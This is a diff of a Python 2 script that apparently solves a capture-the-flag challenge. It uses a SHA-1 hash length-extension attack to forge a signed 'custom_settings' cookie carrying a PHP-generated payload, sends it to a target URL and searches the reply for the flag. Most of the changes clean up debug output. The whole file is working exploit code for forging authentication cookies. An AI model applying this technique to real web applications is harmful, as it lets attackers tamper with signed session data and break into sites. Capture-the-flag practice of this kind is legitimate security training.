@@ -1,6 +1,5 @@
 import subprocess
 import urllib
-from pwn import *
 import commands
 import sys
 import hlextend
@@ -9,9 +8,8 @@ import cookielib
 import requests
 import subprocess
 
-
-def encode(s):
-    print "ENCODE: " + s
+def php_urlencode(s):
+    '''Return php urlencoded string'''
     s = s.replace("\x00", "\0")
     encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)
 
@@ -47,35 +45,20 @@ with open('phpscript.php', 'w') as f:
     f.write(php_script)
 
 php_output = subprocess.check_output('php phpscript.php', shell=True, stderr=subprocess.STDOUT)
-print '-' * 10 + " ORIGINAL OUTPUT " + '-' * 10
-print php_output
-# php_output = php_output.split('<')[0].replace('\x00', '')
-php_output = php_output.split('<')[0]
-
-print '-' * 10 + " PHP OUTPUT " + '-' * 10
-print php_output
-php_output = php_output.split('\n')[1]
+php_output = php_output.split('<')[0].split('\n')[1]
 
 original_hash = '2141b332222df459fd212440824a35e63d37ef69'
 original_data = 'b:1;'
+# '\x0a' is our new line delimiter
 appended_data = '\x0a' + php_output
 key_length = 8
-
-print '-' * 10 + " HLEXTEND ARGS " + '-' * 10
-print original_hash
-print original_data
-print appended_data
 
 sha = hlextend.new('sha1')
 cookie = sha.extend(appended_data, original_data, key_length, original_hash)
 cookie_hash = sha.hexdigest()
 
-print "COOKIE: " + cookie
-print "HASH: " + cookie_hash
-
-output = encode(cookie)
-# output = cookie
+output = php_urlencode(cookie)
 cookies = {'custom_settings_hash': cookie_hash,
            'custom_settings': output}
-print cookies
-print requests.get(url, cookies=cookies).text
+results = requests.get(url, cookies=cookies).text
+print [line for line in results.split('\n') if 'yay_flag' in line]
